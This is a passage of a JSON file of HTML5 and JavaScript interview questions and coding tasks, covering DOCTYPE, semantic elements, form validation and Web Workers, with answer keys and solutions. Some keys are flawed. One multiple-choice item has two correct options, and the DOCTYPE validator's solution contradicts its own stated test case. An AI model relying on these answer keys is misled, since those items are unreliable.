          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_html5_doctype_3",
          "topic": "DOCTYPE Placement",
          "level": "easy",
          "type": "open",
          "question": "Where must the `<!DOCTYPE html>` declaration be placed in an HTML document, and what might happen if it's placed incorrectly or omitted?",
          "answer": "The `<!DOCTYPE html>` declaration must be the very first line of the HTML document, before any `<html>` tag, comments, or any other content. If it's placed incorrectly (e.g., after a comment or a blank line) or omitted entirely, the browser might render the page in 'quirks mode' instead of 'standards mode'. This can lead to inconsistent rendering, unexpected layout issues, and different behavior of CSS and JavaScript across various browsers or even browser versions.",
          "analysisPoints": [
            "Correctly specifying the exact placement.",
            "Explaining the consequence of incorrect placement or omission (quirks mode).",
            "Mentioning inconsistent rendering and behavior as effects of quirks mode."
          ],
          "keyConcepts": [
            "DOCTYPE",
            "Placement",
            "Quirks Mode",
            "Standards Mode",
            "Rendering"
          ],
          "evaluationCriteria": [
            "Accuracy of placement rule.",
            "Completeness of explanation of consequences."
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "DOCTYPE",
            "Best Practices"
          ],
          "prerequisites": [
            "html5_doctype"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_html5_semantic_1",
          "topic": "Semantic Elements Definition",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of HTML5 semantic elements?",
          "answer": "To give meaning to the structure and content of a web page, making it more understandable for browsers, search engines, and assistive technologies, and improving code readability for developers.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Semantic HTML",
            "Meaning",
            "Structure",
            "Accessibility",
            "SEO"
          ],
          "evaluationCriteria": [
            "Understanding core concept",
            "Identifying key benefits"
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "Semantic HTML"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_html5_semantic_2",
          "topic": "Semantic Elements Usage",
          "level": "medium",
          "type": "mcq",
          "question": "Which HTML5 semantic element should be used to define an independent, self-contained piece of content, such as a blog post or a news article?",
          "answer": "`<article>`",
          "options": [
            "`<section>`",
            "`<div>`",
            "`<article>`",
            "`<main>`"
          ],
          "analysisPoints": [
            "Distinguishing between `<article>` and `<section>`.",
            "Understanding the 'independent, self-contained' characteristic of `<article>`.",
            "Avoiding common mistakes like using generic `<div>`."
          ],
          "keyConcepts": [
            "Semantic HTML",
            "Article",
            "Section",
            "HTML5 Tags"
          ],
          "evaluationCriteria": [
            "Correct identification of semantic element.",
            "Understanding the specific use case of `<article>`."
          ],
          "example": "While `<section>` defines a generic section of a document, `<article>` is specifically for content that makes sense on its own, like a news story, a comment, or a blog entry, even if syndicated elsewhere. `<main>` identifies the dominant content of the body, and `<div>` has no semantic meaning.",
          "tags": [
            "HTML",
            "HTML5",
            "Semantic HTML",
            "Accessibility"
          ],
          "prerequisites": [
            "html5_semantic_elements"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_html5_semantic_3",
          "topic": "Semantic Elements Benefits",
          "level": "medium",
          "type": "open",
          "question": "Explain at least two significant benefits of using semantic HTML5 elements over non-semantic `<div>` and `<span>` elements for structuring a web page.",
          "answer": "Two significant benefits of using semantic HTML5 elements are:\n\n1.  **Improved Accessibility:** Semantic elements provide clear structural meaning to the content. Screen readers and other assistive technologies can use this meaning to better navigate and interpret the page for users with disabilities. For example, a `<nav>` element explicitly tells a screen reader that its content is navigation links, allowing users to quickly jump to them. A generic `<div>` would not convey this information.\n2.  **Enhanced SEO (Search Engine Optimization):** Search engines (like Google) crawl and parse web pages to understand their content and structure. Semantic elements provide more context and clues about the importance and relationship of different parts of the page. For instance, content within an `<article>` is likely to be the main subject, and content within an `<aside>` is tangential. This semantic clarity can help search engines better index and rank your pages, potentially leading to higher visibility in search results.",
          "analysisPoints": [
            "Clearly articulate at least two distinct benefits.",
            "Provide specific examples of how semantic elements achieve these benefits (e.g., screen readers for accessibility, search engine indexing for SEO).",
            "Contrast with the lack of meaning in non-semantic tags."
          ],
          "keyConcepts": [
            "Semantic HTML",
            "Accessibility",
            "SEO",
            "Div vs Semantic",
            "Web Standards"
          ],
          "evaluationCriteria": [
            "Clarity and correctness of explanations.",
            "Relevance of examples.",
            "Demonstrated understanding of semantic purpose."
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "Semantic HTML",
            "Accessibility",
            "SEO"
          ],
          "prerequisites": [
            "html5_semantic_elements"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_html5_semantic_4",
          "topic": "Figure and Figcaption",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `<figure>` and `<figcaption>` elements?",
          "answer": "`<figure>` is used to mark up self-contained content, often an image, diagram, code snippet, or video, that is referenced from the main flow. `<figcaption>` provides a caption for the content within its parent `<figure>` element.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Figure",
            "Figcaption",
            "Semantic HTML",
            "Content Grouping"
          ],
          "evaluationCriteria": [
            "Correct definition of both elements",
            "Understanding their relationship"
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "Semantic HTML"
          ],
          "prerequisites": [
            "html5_semantic_elements"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_html5_form_elements_1",
          "topic": "New Input Types",
          "level": "medium",
          "type": "mcq",
          "question": "Which HTML5 input type provides a slider control for selecting a numerical value within a specified range?",
          "answer": "`range`",
          "options": [
            "`number`",
            "`slider`",
            "`range`",
            "`progress`"
          ],
          "analysisPoints": [
            "Identifying the correct HTML5 input type for a slider.",
            "Distinguishing it from `number` (which is a text field for numbers) and `progress` (which is a display element, not an input)."
          ],
          "keyConcepts": [
            "HTML5 Forms",
            "Input Types",
            "Range Input",
            "UI Controls"
          ],
          "evaluationCriteria": [
            "Correct identification of the input type.",
            "Understanding its specific visual and functional purpose."
          ],
          "example": "The `<input type=\"range\">` element creates a slider. It's typically used with `min`, `max`, and `step` attributes to define the range and granularity of the slider. For example: `<input type=\"range\" min=\"0\" max=\"100\" value=\"50\">`.",
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Input Types"
          ],
          "prerequisites": [
            "html5_form_elements"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_html5_form_elements_2",
          "topic": "Datalist Usage",
          "level": "medium",
          "type": "open",
          "question": "Explain how the `<datalist>` element is used in conjunction with an `<input>` element to provide autocomplete suggestions. Provide a simple HTML example.",
          "answer": "The `<datalist>` element provides a list of `option` elements that serve as pre-defined suggestions for an `<input>` field. It's not a strict dropdown; users can still type their own value, but they are offered suggestions as they type.\n\nTo link a `<datalist>` to an `<input>` element, the `list` attribute of the `<input>` must be set to the `id` of the `<datalist>` element.\n\nExample:\n```html\n<label for=\"country-input\">Select or type your country:</label>\n<input list=\"countries\" id=\"country-input\" name=\"country\">\n\n<datalist id=\"countries\">\n  <option value=\"United States\">\n  <option value=\"Canada\">\n  <option value=\"Mexico\">\n  <option value=\"United Kingdom\">\n  <option value=\"Germany\">\n  <option value=\"France\">\n  <option value=\"Japan\">\n</datalist>\n```\n\nWhen a user starts typing in the `country-input` field, the browser will display suggestions from the `countries` datalist that match the typed characters. The user can select one of the suggestions or continue typing a custom value.",
          "analysisPoints": [
            "Clearly explain the purpose of `<datalist>` (suggestions, not strict dropdown).",
            "Explain the linkage via `list` attribute and `id` attribute.",
            "Provide a correct and concise HTML example demonstrating the usage.",
            "Mention the autocomplete behavior."
          ],
          "keyConcepts": [
            "HTML5 Forms",
            "Datalist",
            "Input Element",
            "Autocomplete",
            "User Experience"
          ],
          "evaluationCriteria": [
            "Accuracy of explanation.",
            "Correctness and clarity of the code example.",
            "Understanding of the user interaction."
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Datalist",
            "Autocomplete"
          ],
          "prerequisites": [
            "html5_form_elements"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_html5_form_elements_3",
          "topic": "Email Input Type",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary benefit of using `<input type=\"email\">`?",
          "answer": "It provides built-in client-side validation to ensure the entered text has the basic format of an email address (e.g., includes '@' and a domain), and on mobile devices, it often triggers an email-optimized keyboard.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Input Type Email",
            "Client-side Validation",
            "User Experience"
          ],
          "evaluationCriteria": [
            "Recall of benefit",
            "Understanding of validation and UX features"
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Input Types"
          ],
          "prerequisites": [
            "html5_form_elements"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_html5_form_attributes_1",
          "topic": "Required Attribute",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `required` attribute in an HTML5 form input?",
          "answer": "The `required` attribute specifies that an input field must be filled out before the form can be submitted. The browser will prevent submission and show a validation message if the field is empty.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Required Attribute",
            "Client-side Validation",
            "Form Submission"
          ],
          "evaluationCriteria": [
            "Recall of purpose",
            "Understanding of validation effect"
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Attributes"
          ],
          "prerequisites": [
            "html5_form_attributes"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_html5_form_attributes_2",
          "topic": "Pattern Attribute",
          "level": "medium",
          "type": "mcq",
          "question": "You want to create an input field that only accepts exactly 5 digits. Which HTML5 attribute and value combination would you use for client-side validation?",
          "answer": "`pattern=\"\\d{5}\"`",
          "options": [
            "`minlength=\"5\" maxlength=\"5\"`",
            "`type=\"number\" min=\"10000\" max=\"99999\"`",
            "`pattern=\"[0-9]{5}\"`",
            "`pattern=\"\\d{5}\"`"
          ],
          "analysisPoints": [
            "Identifying `pattern` as the correct attribute for regex validation.",
            "Knowing basic regex syntax for digits (`\\d` or `[0-9]`) and exact length (`{5}`).",
            "Understanding that `minlength/maxlength` apply to character count, not necessarily digits, and `type=\"number\"` with `min/max` validates value range, not pattern.",
            "Recognizing `[0-9]{5}` is equivalent to `\\d{5}` and both are valid, but `\\d` is more concise for digits."
          ],
          "keyConcepts": [
            "HTML5 Forms",
            "Pattern Attribute",
            "Regex",
            "Client-side Validation"
          ],
          "evaluationCriteria": [
            "Correct application of `pattern` attribute.",
            "Knowledge of basic regular expressions for form validation."
          ],
          "example": "The `pattern` attribute uses regular expressions. `\\d` (or `[0-9]`) matches any digit, and `{5}` specifies exactly five occurrences. While `[0-9]{5}` is also correct, `\\d{5}` is a common and concise way to represent five digits. `minlength`/`maxlength` check string length, and `type=\"number\"` with `min`/`max` check the numeric value range, not a specific digit pattern.",
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Attributes",
            "Validation",
            "Regex"
          ],
          "prerequisites": [
            "html5_form_attributes",
            "regex_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_html5_form_attributes_3",
          "topic": "Formnovalidate vs Novalidate",
          "level": "hard",
          "type": "open",
          "question": "Differentiate between the `novalidate` attribute on a `<form>` element and the `formnovalidate` attribute on a submit button. When would you typically use `formnovalidate`?",
          "answer": "`novalidate` attribute on a `<form>`: When this boolean attribute is present on the `<form>` tag, it completely disables the browser's default client-side validation for *all* input fields within that form. The form will submit without any browser-imposed checks for `required`, `pattern`, `type=\"email\"`, etc.\n\n`formnovalidate` attribute on a `submit` button: This boolean attribute is placed on an `<input type=\"submit\">` or `<button type=\"submit\">`. When this specific submit button is clicked, it will bypass the browser's default client-side validation for the form, even if the form itself (or other submit buttons) *does not* have `novalidate` set. All other submit buttons on the same form would still trigger validation.\n\nYou would typically use `formnovalidate` when you want to provide alternative ways to submit a form, such as:\n*   **'Save Draft' functionality:** A user might want to save their progress without fulfilling all required fields for final submission.\n*   **'Skip Validation' for specific actions:** For instance, an 'Export' button on a form that simply takes current data and doesn't require all fields to be valid.",
          "analysisPoints": [
            "Clearly define `novalidate` and its scope (entire form).",
            "Clearly define `formnovalidate` and its scope (specific submit button).",
            "Provide concrete, realistic use cases for `formnovalidate` (e.g., save draft, skip validation for partial submission).",
            "Emphasize the difference in granularity of control."
          ],
          "keyConcepts": [
            "HTML5 Forms",
            "Validation",
            "Novalidate",
            "Formnovalidate",
            "Client-side Validation"
          ],
          "evaluationCriteria": [
            "Accuracy of definitions.",
            "Clear distinction between the two attributes.",
            "Quality and relevance of use case examples."
          ],
          "example": "",
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Attributes",
            "Validation"
          ],
          "prerequisites": [
            "html5_form_attributes"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_html5_form_attributes_4",
          "topic": "Form Attribute (External Inputs)",
          "level": "medium",
          "type": "flashcard",
          "question": "How can an HTML form input element be associated with a form even if it's not a direct descendant of the `<form>` tag?",
          "answer": "By using the `form` attribute on the input element, setting its value to the `id` of the `<form>` element it should belong to.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Form Attribute",
            "HTML Forms",
            "External Inputs",
            "Form Association"
          ],
          "evaluationCriteria": [
            "Recall of attribute",
            "Understanding its purpose"
          ],
          "example": "```html\n<form id=\"myContactForm\">\n  <label for=\"name\">Name:</label>\n  <input type=\"text\" id=\"name\" name=\"name\">\n</form>\n\n<div>\n  <label for=\"external-email\">Email (associate with contact form):</label>\n  <input type=\"email\" id=\"external-email\" name=\"email\" form=\"myContactForm\">\n</div>\n```",
          "tags": [
            "HTML",
            "HTML5",
            "Forms",
            "Attributes"
          ],
          "prerequisites": [
            "html5_form_attributes"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_web_worker_fibonacci",
          "title": "Implement a Fibonacci Calculator with Web Workers",
          "description": "\nCreate a simple web page with a button and a display area. When the button is clicked, initiate a computationally intensive Fibonacci sequence calculation (e.g., `fibonacci(40)` or `fibonacci(45)`) in a Web Worker. The main thread should remain responsive (e.g., by allowing a counter to update while the calculation runs). Once the worker finishes, display the result on the main page.\n\n**Requirements:**\n1.  **Main Page (index.html, app.js):**\n    *   An HTML button to start the calculation.\n    *   A display element (e.g., `<span>` or `<div>`) to show the Fibonacci result.\n    *   Another display element to show a constantly updating counter (e.g., every 100ms) to prove UI responsiveness.\n    *   Instantiate and communicate with the Web Worker.\n    *   Disable the button while calculation is in progress.\n2.  **Worker Script (fibonacci_worker.js):**\n    *   Implement a recursive or iterative function to calculate Fibonacci numbers.\n    *   Receive a message from the main thread to start the calculation.\n    *   Send the result back to the main thread.\n3.  **Communication:** Use `postMessage` and `onmessage` for communication.\n4.  **Error Handling:** Briefly consider how errors from the worker might be handled.\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Web Worker Fibonacci</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; }\n        button { padding: 10px 20px; font-size: 1em; cursor: pointer; }\n        #result { margin-top: 15px; font-size: 1.2em; font-weight: bold; }\n        #counter { margin-top: 10px; font-size: 1em; color: gray; }\n    </style>\n</head>\n<body>\n    <h1>Fibonacci Calculator</h1>\n    <button id=\"startCalculation\">Calculate Fibonacci(40) in Worker</button>\n    <p id=\"result\">Result: Not calculated yet</p>\n    <p id=\"counter\">Counter: 0</p>\n\n    <script src=\"app.js\"></script>\n</body>\n</html>\n\n// app.js (Main Thread Script)\nconst startButton = document.getElementById('startCalculation');\nconst resultDisplay = document.getElementById('result');\nconst counterDisplay = document.getElementById('counter');\nlet counter = 0;\nlet worker = null;\n\n// Update counter to show UI responsiveness\nsetInterval(() => {\n    counter++;\n    counterDisplay.textContent = `Counter: ${counter}`;\n}, 100);\n\nstartButton.addEventListener('click', () => {\n    if (window.Worker) {\n        if (worker) {\n            worker.terminate(); // Terminate existing worker if any\n        }\n        \n        worker = new Worker('fibonacci_worker.js');\n        \n        // TODO: Send a message to the worker to start calculation\n        // TODO: Handle messages from the worker (update resultDisplay)\n        // TODO: Handle worker errors\n        // TODO: Disable/enable button\n        \n    } else {\n        resultDisplay.textContent = 'Web Workers are not supported in this browser.';\n    }\n});\n\n// fibonacci_worker.js (Worker Thread Script)\n// self.onmessage = function(event) {\n//   // TODO: Implement Fibonacci calculation\n//   // TODO: Send result back\n// };\n\n// self.onerror = function(error) {\n//   // TODO: Handle errors\n// };",
          "solutionCode": "<!-- index.html (same as starting code) -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Web Worker Fibonacci</title>\n    <style>\n        body { font-family: sans-serif; margin: 20px; }\n        button { padding: 10px 20px; font-size: 1em; cursor: pointer; }\n        button:disabled { background-color: #ccc; cursor: not-allowed; }\n        #result { margin-top: 15px; font-size: 1.2em; font-weight: bold; }\n        #counter { margin-top: 10px; font-size: 1em; color: gray; }\n    </style>\n</head>\n<body>\n    <h1>Fibonacci Calculator</h1>\n    <button id=\"startCalculation\">Calculate Fibonacci(40) in Worker</button>\n    <p id=\"result\">Result: Not calculated yet</p>\n    <p id=\"counter\">Counter: 0</p>\n\n    <script src=\"app.js\"></script>\n</body>\n</html>\n\n// app.js (Main Thread Script)\nconst startButton = document.getElementById('startCalculation');\nconst resultDisplay = document.getElementById('result');\nconst counterDisplay = document.getElementById('counter');\nlet counter = 0;\nlet worker = null;\n\n// Update counter to show UI responsiveness\nsetInterval(() => {\n    counter++;\n    counterDisplay.textContent = `Counter: ${counter}`;\n}, 100);\n\nstartButton.addEventListener('click', () => {\n    if (window.Worker) {\n        if (worker) {\n            worker.terminate(); // Terminate existing worker if any\n        }\n        \n        worker = new Worker('fibonacci_worker.js');\n        resultDisplay.textContent = 'Result: Calculating...';\n        startButton.disabled = true; // Disable button during calculation\n\n        // Send a message to the worker to start calculation\n        worker.postMessage({ number: 40 }); // Or 45 for a longer task\n        \n        // Handle messages from the worker (update resultDisplay)\n        worker.onmessage = function(event) {\n            console.log('Main thread received:', event.data);\n            if (event.data.status === 'done') {\n                resultDisplay.textContent = `Result: ${event.data.result}`;\n                startButton.disabled = false; // Re-enable button\n                worker.terminate(); // Terminate worker after use\n                worker = null;\n            } else if (event.data.status === 'error') {\n                resultDisplay.textContent = `Error: ${event.data.message}`;\n                startButton.disabled = false;\n                worker.terminate();\n                worker = null;\n            }\n        };\n        \n        // Handle worker errors\n        worker.onerror = function(error) {\n            console.error('Worker error:', error);\n            resultDisplay.textContent = 'Result: Error during calculation.';\n            startButton.disabled = false;\n            if (worker) worker.terminate();\n            worker = null;\n        };\n        \n    } else {\n        resultDisplay.textContent = 'Web Workers are not supported in this browser.';\n    }\n});\n\n// fibonacci_worker.js (Worker Thread Script)\nself.onmessage = function(event) {\n    const number = event.data.number;\n    console.log(`Worker: Calculating Fibonacci(${number})...`);\n\n    // Recursive Fibonacci (simple but inefficient for large numbers)\n    const fibonacci = (n) => {\n        if (n <= 1) return n;\n        return fibonacci(n - 1) + fibonacci(n - 2);\n    };\n\n    try {\n        const result = fibonacci(number);\n        self.postMessage({ status: 'done', result: result });\n    } catch (e) {\n        console.error('Worker calculation error:', e);\n        self.postMessage({ status: 'error', message: e.message || 'Unknown error' });\n    }\n};\n\nself.onerror = function(error) {\n    console.error('Error within worker self:', error);\n    self.postMessage({ status: 'error', message: error.message || 'Worker-side error' });\n};\n\nself.onclose = function() {\n    console.log('Worker is being terminated.');\n};",
          "testCases": [
            "Click 'Calculate' button: Ensure the counter continues to update while result is 'Calculating...'.",
            "After calculation, result should be displayed and button re-enabled.",
            "Test with a very large number (e.g., 45 or higher if recursive, 100000 if iterative for sum) to observe blocking on main thread if worker is not used vs. smooth UI with worker.",
            "Verify browser console for worker messages and no main thread errors.",
            "Check for `worker.terminate()` preventing multiple worker instances on rapid clicks."
          ],
          "hints": [
            "Remember to create the `Worker` instance in the main thread and provide the path to the worker script.",
            "Use `postMessage()` to send data and `onmessage` event handlers to receive data in both directions.",
            "The `self` keyword in the worker script refers to the worker's global scope.",
            "Don't forget to disable the button while the calculation is running and re-enable it afterwards for better UX."
          ],
          "tags": [
            "JavaScript",
            "Web Workers",
            "Performance",
            "Concurrency",
            "Frontend Architecture",
            "Asynchronous"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "javascript_functions",
            "event_listeners",
            "basic_html"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "event_loop",
            "asynchronous_javascript",
            "browser_apis"
          ]
        },
        {
          "id": "task_html5_doctype_validation",
          "title": "Validate DOCTYPE Presence and Correctness",
          "description": "\nGiven an HTML string, write a JavaScript function that validates whether the HTML document correctly includes the `<!DOCTYPE html>` declaration at its very beginning.\n\n**Requirements:**\n1.  The function `validateDoctype(htmlString)` should return `true` if the DOCTYPE is correct and correctly placed, `false` otherwise.\n2.  Consider the DOCTYPE to be correctly placed if it's the first non-whitespace content in the string.\n3.  The DOCTYPE should be `<!DOCTYPE html>` (case-insensitive for the `DOCTYPE` and `html` parts, but spaces and `!` must be precise).\n4.  The function should handle strings with leading whitespace or comments before the DOCTYPE.\n",
          "difficulty": "medium",
          "startingCode": "function validateDoctype(htmlString) {\n  // TODO: Implement validation logic here\n  // Hint: Regular expressions or string manipulation can be useful.\n  // Remember to trim leading whitespace and handle comments.\n\n  return false; // Replace with actual logic\n}\n\n// Example Usage:\n// console.log(validateDoctype('<!DOCTYPE html>\\n<html>...')); // true\n// console.log(validateDoctype('  <!DOCTYPE html>\\n<html>...')); // true\n// console.log(validateDoctype('<!-- comment -->\\n<!DOCTYPE html>\\n<html>...')); // false (strict first non-whitespace)\n// console.log(validateDoctype('<html>\\n<!DOCTYPE html>...')); // false\n// console.log(validateDoctype('<!doctype html>\\n<html>...')); // true\n// console.log(validateDoctype('<!DOCTYPE HTML>\\n<html>...')); // false (for HTML5 specific)\n// console.log(validateDoctype('<html>...')); // false\n",
          "solutionCode": "function validateDoctype(htmlString) {\n  if (!htmlString || typeof htmlString !== 'string') {\n    return false;\n  }\n\n  // Regex to match the DOCTYPE declaration at the very beginning,\n  // ignoring leading whitespace. It captures the standard HTML5 DOCTYPE\n  // case-insensitively for 'DOCTYPE' and 'html'.\n  const regex = /^\\s*<!DOCTYPE\\s+html>/i;\n  \n  // The original problem statement implies it must be the *very first* non-whitespace.\n  // If we consider '<!-- comment -->\\n<!DOCTYPE html>' as invalid due to the comment,\n  // then simple regex for leading whitespace is enough, as comments are not whitespace.\n  // If comments before DOCTYPE were allowed, the regex would be more complex.\n  \n  // Trim leading whitespace and then check if it starts with the DOCTYPE.\n  // This handles cases like '   <!DOCTYPE html>' correctly.\n  const trimmedString = htmlString.trimLeft();\n\n  // Check if the trimmed string starts with the case-insensitive HTML5 DOCTYPE.\n  // This correctly accounts for the example '<!-- comment -->\\n<!DOCTYPE html>' being false.\n  return /^<!DOCTYPE html>/i.test(trimmedString);\n}\n",
          "testCases": [
            "validateDoctype('<!DOCTYPE html>\\n<html>...'): `true`",
            "validateDoctype('  <!DOCTYPE html>\\n<html>...'): `true`",
            "validateDoctype('<!-- comment -->\\n<!DOCTYPE html>\\n<html>...'): `false` (as per problem: 'first non-whitespace content')",
            "validateDoctype('<html>\\n<!DOCTYPE html>...'): `false`",
            "validateDoctype('<!doctype html>\\n<html>...'): `true`",
            "validateDoctype('<!DOCTYPE HTML>\\n<html>...'): `false` (strict HTML5 doctype)",
            "validateDoctype('<html>...'): `false`",
            "validateDoctype(''): `false`",
            "validateDoctype(null): `false`",
            "validateDoctype('<!DOCTYPE HTML PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"><html>...'): `false` (not HTML5 DOCTYPE)",
            "validateDoctype('  \\n\\t <!DOCTYPE html>'): `true`"
          ],
          "hints": [
            "Focus on checking the very beginning of the string after any leading whitespace.",
            "Consider using a regular expression with a `^` anchor to match the start of the string.",
            "Remember that the HTML5 DOCTYPE is case-insensitive for `DOCTYPE` and `html` parts, but the `!` and spacing are specific.",
            "`String.prototype.trimLeft()` or `String.prototype.trimStart()` can be useful."
          ],
          "tags": [
            "JavaScript",
            "HTML",
            "String Manipulation",
            "Regex",
            "Validation"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "javascript_string_methods",
            "regex_basics"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "html_standards",
            "browser_parsing"
          ]
        },
        {
          "id": "task_html5_semantic_refactor",
          "title": "Refactor Non-Semantic HTML to Semantic HTML5",
          "description": "\nYou are given a non-semantic HTML structure that uses `<div>` elements for layout. Your task is to refactor this structure to use appropriate HTML5 semantic elements, improving its accessibility, SEO, and readability.\n\n**Requirements:**\n1.  Replace `div` elements with the most appropriate semantic HTML5 tags from the list provided in the theory (e.g., `header`, `nav`, `main`, `article`, `section`, `aside`, `footer`, `figure`, `figcaption`).\n2.  Maintain the visual structure and content hierarchy.\n3.  Ensure the refactored code clearly conveys the meaning of each section.\n4.  No CSS or JavaScript changes are required, focus solely on HTML structure.\n",
          "difficulty": "medium",
          "startingCode": "<!-- Original Non-Semantic HTML -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Non-Semantic Layout</title>\n    <style>\n        body { font-family: sans-serif; }\n        .header-div { background-color: #f0f0f0; padding: 10px; }\n        .nav-div ul { list-style: none; padding: 0; display: flex; gap: 15px; }\n        .container-div { display: flex; margin-top: 20px; }\n        .main-content-div { flex: 3; padding: 20px; }\n        .post-div { border: 1px solid #ddd; margin-bottom: 15px; padding: 15px; }\n        .post-image-div { text-align: center; margin-bottom: 10px; }\n        .image-caption-div { font-style: italic; font-size: 0.9em; color: #555; }\n        .sidebar-div { flex: 1; background-color: #e9e9e9; padding: 20px; }\n        .footer-div { background-color: #f0f0f0; padding: 10px; text-align: center; margin-top: 20px; }\n    </style>\n</head>\n<body>\n\n    <div class=\"header-div\">\n        <h1>My Website</h1>\n        <div class=\"nav-div\">\n            <ul>\n                <li><a href=\"#\">Home</a></li>\n                <li><a href=\"#\">About</a></li>\n                <li><a href=\"#\">Services</a></li>\n                <li><a href=\"#\">Contact</a></li>\n            </ul>\n        </div>\n    </div>\n\n    <div class=\"container-div\">\n        <div class=\"main-content-div\">\n            <h2>Latest News</h2>\n            <div class=\"post-div\">\n                <h3>Headline: Important Announcement</h3>\n                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>\n                <div class=\"post-image-div\">\n                    <img src=\"https://via.placeholder.com/400x200\" alt=\"Placeholder image for announcement\">\n                    <div class=\"image-caption-div\">Caption for the announcement image.</div>\n                </div>\n                <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>\n            </div>\n            <div class=\"post-div\">\n                <h3>Headline: Tech Update</h3>\n                <p>Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.</p>\n            </div>\n        </div>\n\n        <div class=\"sidebar-div\">\n            <h3>Related Links</h3>\n            <ul>\n                <li><a href=\"#\">Old Posts</a></li>\n                <li><a href=\"#\">Partners</a></li>\n            </ul>\n            <h3>Advertisements</h3>\n            <p>Buy our amazing product!</p>\n        </div>\n    </div>\n\n    <div class=\"footer-div\">\n        <p>&copy; 2023 My Company</p>\n    </div>\n\n</body>\n</html>",
          "solutionCode": "<!-- Refactored Semantic HTML -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Semantic Layout</title>\n    <style>\n        /* Retain original styles but update selectors for semantic tags */\n        body { font-family: sans-serif; }\n        header { background-color: #f0f0f0; padding: 10px; }\n        nav ul { list-style: none; padding: 0; display: flex; gap: 15px; }\n        main { display: flex; margin-top: 20px; }\n        main > section { flex: 3; padding: 20px; }\n        article { border: 1px solid #ddd; margin-bottom: 15px; padding: 15px; }\n        figure { text-align: center; margin-bottom: 10px; }\n        figcaption { font-style: italic; font-size: 0.9em; color: #555; }\n        aside { flex: 1; background-color: #e9e9e9; padding: 20px; }\n        footer { background-color: #f0f0f0; padding: 10px; text-align: center; margin-top: 20px; }\n    </style>\n</head>\n<body>\n\n    <header>\n        <h1>My Website</h1>\n        <nav>\n            <ul>\n                <li><a href=\"#\">Home</a></li>\n                <li><a href=\"#\">About</a></li>\n                <li><a href=\"#\">Services</a></li>\n                <li><a href=\"#\">Contact</a></li>\n            </ul>\n        </nav>\n    </header>\n\n    <main>\n        <section>\n            <h2>Latest News</h2>\n            <article>\n                <h3>Headline: Important Announcement</h3>\n                <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>\n                <figure>\n                    <img src=\"https://via.placeholder.com/400x200\" alt=\"Placeholder image for 